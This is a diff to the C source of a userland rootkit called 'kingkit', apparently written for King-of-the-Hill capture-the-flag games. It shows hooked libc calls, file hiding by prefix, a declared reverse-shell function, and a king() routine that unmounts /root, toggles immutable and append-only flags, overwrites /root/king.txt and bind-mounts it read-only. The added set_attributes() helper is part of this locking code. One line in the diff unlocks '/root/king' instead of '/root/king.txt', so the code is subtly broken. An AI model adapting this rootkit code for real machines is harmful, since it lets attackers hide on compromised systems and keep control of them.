@@ -3,9 +3,9 @@
  */
 
 
-#include <linux/limits.h>
 #define _GNU_SOURCE
 
+#include <linux/limits.h>
 #include <stdlib.h>
 #include <limits.h>
 #include <dlfcn.h>
@@ -39,14 +39,17 @@
 //don't change these
 #define PREFIX_LEN (sizeof(HIDE_PREFIX) - 1)
 #define FILEMODE S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH
+#define UNLOCK_FILE 0
+#define LOCK_FILE 1
 
 
 
 //function declarations
-int king();
+void *syscall_address(void *, const char *);
 char *fd_to_path(int);
 char *dirfd_pathname_to_path(int, const char *);
-void *syscall_address(void *, const char *);
+int set_attributes(const char *, int);
+int king();
 void revshell();
 
 
@@ -161,6 +164,36 @@ char *dirfd_pathname_to_path(int dirfd, const char *pathname) {
 }
 
 
+int set_attributes(const char *pathname, int action) {
+    #if DEBUG
+    printf("[kingkit] set_attributes() called with pathname: %s and action: %d.\n", pathname, action);
+    #endif
+    if (getuid() != 0) {
+        #if DEBUG
+        printf("[kingkit] set_attributes() is called by a non-root user.\n");
+        #endif
+        return -1;
+    }
+    original_open = syscall_address(original_open, "open");
+    int attr;
+    int fd = (*original_open)(pathname, O_RDONLY);
+    if (fd == -1) {
+        #if DEBUG
+        perror("open");
+        #endif
+        return -1;
+    }
+    ioctl(fd, FS_IOC_GETFLAGS, &attr);
+    if (action) { //lock file
+        attr |= FS_APPEND_FL | FS_IMMUTABLE_FL;
+    } else { //unlock file
+        attr ^= attr & (FS_APPEND_FL | FS_IMMUTABLE_FL);
+    }
+    ioctl(fd, FS_IOC_SETFLAGS, &attr);
+    return 0;
+}
+
+
 int king() {
     #if DEBUG
     printf("[kingkit] king() called.\n");
@@ -177,18 +210,15 @@ int king() {
     umount2("/root", MNT_DETACH);
     umount2("/root/king.txt", MNT_DETACH);
     //remove immutable and append-only flags
-    int rootfd, kingfd;
-    rootfd =  (*original_open)("/root", O_RDONLY);
-    ioctl(rootfd, FS_IOC_SETFLAGS, 0);
-    kingfd = (*original_open)("/root/king.txt", O_RDWR | O_TRUNC | O_CREAT, FILEMODE);
-    ioctl(kingfd, FS_IOC_SETFLAGS, 0);
+    set_attributes("/root", UNLOCK_FILE);
+    set_attributes("/root/king", UNLOCK_FILE);
     //write nick to king.txt
+    int kingfd = (*original_open)("/root/king.txt", O_RDWR | O_TRUNC | O_CREAT, FILEMODE);
     write(kingfd, KING_NAME, (sizeof(KING_NAME) -1));
-    //set immutable and append-only flags
-    ioctl(kingfd, FS_IOC_SETFLAGS, 16);
-    ioctl(rootfd, FS_IOC_SETFLAGS, 16);
     close(kingfd);
-    close(rootfd);
+    //set immutable and append-only flags
+    set_attributes("/root/king.txt", LOCK_FILE);
+    set_attributes("/root", LOCK_FILE);
     //mount king.txt readonly
     (*original_mount)("/root/king.txt", "/root/king.txt", NULL, MS_BIND, NULL);
     (*original_mount)("/root/king.txt", "/root/king.txt", NULL, MS_REMOUNT | MS_BIND | MS_RDONLY, NULL); //for some stupid reason you need to remount to make a bind mount readonly
